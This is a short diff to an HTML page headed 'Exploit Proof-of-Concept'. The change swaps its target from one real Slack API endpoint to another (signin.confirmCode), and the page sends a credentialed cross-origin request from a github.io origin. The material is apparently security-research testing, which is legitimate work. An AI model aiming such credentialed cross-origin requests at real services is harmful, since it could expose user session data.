@@ -17,7 +17,7 @@
 
 <div class="box">
     <h2>Exploit Proof-of-Concept</h2>
-    <p>Target: <code>https://amphtml.slack.com/api/auth.passkeys.auth.begin?_x_id=noversion-1790980280.105&slack_route=T00000000&_x_version_ts=noversion&fp=ff&_x_num_retries=0</code></p>
+    <p>Target: <code>https://slack.com/api/signin.confirmCode?_x_id=noversion-1790982506.466</code></p>
     <p>Source Origin: <code>https://stelemane.github.io</code></p>
     
     <div id="status" class="status">[*] Initializing Request...</div>
@@ -29,7 +29,7 @@
         const statusDiv = document.getElementById('status');
         const outputDiv = document.getElementById('output');
         
-        const target = "https://amphtml.slack.com/api/auth.passkeys.auth.begin?_x_id=noversion-1790980280.105&slack_route=T00000000&_x_version_ts=noversion&fp=ff&_x_num_retries=0";
+        const target = "https://slack.com/api/signin.confirmCode?_x_id=noversion-1790982506.466";
 
         statusDiv.innerText = "[*] Sending request with Authorization & Credentials (No Fingerprint)...";
 
